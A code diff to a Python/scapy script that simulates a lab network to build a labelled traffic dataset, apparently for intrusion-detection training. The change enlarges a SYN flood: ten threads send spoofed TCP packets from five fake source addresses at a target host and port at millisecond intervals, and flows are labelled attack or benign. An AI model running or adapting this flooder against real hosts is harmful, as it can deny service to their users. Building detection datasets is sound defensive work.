@@ -9,7 +9,7 @@ from collections import defaultdict
 
 # Define interface and parameters
 INTERFACE = "Wi-Fi 2"
-CAPTURE_DURATION = 200
+CAPTURE_DURATION = 900
 OUTPUT_CSV = "captured_traffic_with_labels.csv"
 
 # Flow statistics storage
@@ -31,36 +31,62 @@ flow_stats = defaultdict(lambda: {
 
 start_time = None
 
-ATTACKER_IP = "192.168.2.50"
-BENIGN_USERS = [  # Increased to 20 users
+# Target
+TARGET_IP = "192.168.1.100"
+TARGET_PORT = 80
+
+BENIGN_USERS = [
     "192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.40",
     "192.168.1.50", "192.168.1.60", "192.168.1.70", "192.168.1.80",
-    "192.168.1.90", "192.168.1.100" , "192.168.1.110" , "192.168.1.120" , "192.168.1.130" , "192.168.1.140" ,
-    "192.168.1.150" , "192.168.1.160" , "192.168.1.170" , "192.168.1.180" , "192.168.1.190" , "192.168.1.200" , 
-    "192.168.1.210" , "192.168.1.220" , "192.168.1.230" , "192.168.1.240" ,
-    "192.168.1.250" , "192.168.2.100" , "192.168.2.110" , "192.168.2.120" , "192.168.2.130" , "192.168.2.130"
+    "192.168.1.90", "192.168.1.100", "192.168.1.110", "192.168.1.120",
+    "192.168.1.130", "192.168.1.140", "192.168.1.150"
 ]
 
-def syn_flood(target_ip, target_port):
+ATTACKER_IPS = ["192.168.2.50", "192.168.2.51", "192.168.2.52", "192.168.2.53", "192.168.2.54"]
+
+# Increase the number of attack threads
+NUM_ATTACK_THREADS = 10  # Match the benign traffic count
+
+def syn_flood():
     while True:
-        ip = scapy.IP(src=ATTACKER_IP, dst=target_ip)
-        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
-        packet = ip / tcp
+        src_ip = random.choice(ATTACKER_IPS)
+        sport = random.randint(1024, 65535)
+        flags = random.choice(["S", "SA", "R", "FA"])
+
+        ip = scapy.IP(src=src_ip, dst=TARGET_IP)
+        tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags=flags, seq=random.randint(1000, 9000))
+        payload = scapy.Raw(load=bytes(random.randint(10, 100)))
+
+        packet = ip / tcp / payload
         scapy.send(packet, verbose=False)
 
-def benign_traffic(target_ip, target_port, src_ip):
+        # Reduce sleep time for higher attack intensity
+        time.sleep(random.uniform(0.001, 0.01))  # Attack runs much faster now
+
+def benign_traffic(src_ip):
     while True:
-        ip = scapy.IP(src=src_ip, dst=target_ip)
-        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="PA")
-        packet = ip / tcp / "Hello, server!"
+        sport = random.randint(1024, 65535)
+        ip = scapy.IP(src=src_ip, dst=TARGET_IP)
+        tcp = scapy.TCP(sport=sport, dport=TARGET_PORT, flags="PA")
+
+        http_get = "GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
+        tcp_payload = scapy.Raw(load=http_get) if random.random() > 0.3 else scapy.Raw(load="Hello, server!")
+
+        packet = ip / tcp / tcp_payload
         scapy.send(packet, verbose=False)
-        time.sleep(random.uniform(0.5, 2))
 
-# Start attacker and benign users
-attacker_thread = threading.Thread(target=syn_flood, args=("192.168.1.100", 80))
-benign_threads = [threading.Thread(target=benign_traffic, args=("192.168.1.100", 80, ip)) for ip in BENIGN_USERS]
+        # Keep benign traffic at a normal pace
+        time.sleep(random.uniform(1, 3))
 
-attacker_thread.start()
+# Launch multiple attack threads for balance
+attack_threads = [threading.Thread(target=syn_flood, daemon=True) for _ in range(NUM_ATTACK_THREADS)]
+benign_threads = [threading.Thread(target=benign_traffic, args=(ip,), daemon=True) for ip in BENIGN_USERS]
+
+# Start attack threads
+for thread in attack_threads:
+    thread.start()
+
+# Start benign threads
 for thread in benign_threads:
     thread.start()
 
@@ -125,7 +151,7 @@ def process_packet(packet):
                     flow_stats[flow_key]["Total Backward Packets"] += 1
                 
                 # **New: Detect SYN Flood Attack**
-                if src_ip == ATTACKER_IP:
+                if src_ip in ATTACKER_IPS:
                     flow_stats[flow_key]["Label"] = "attack"
                 else:
                     flow_stats[flow_key]["Label"] = "benign"
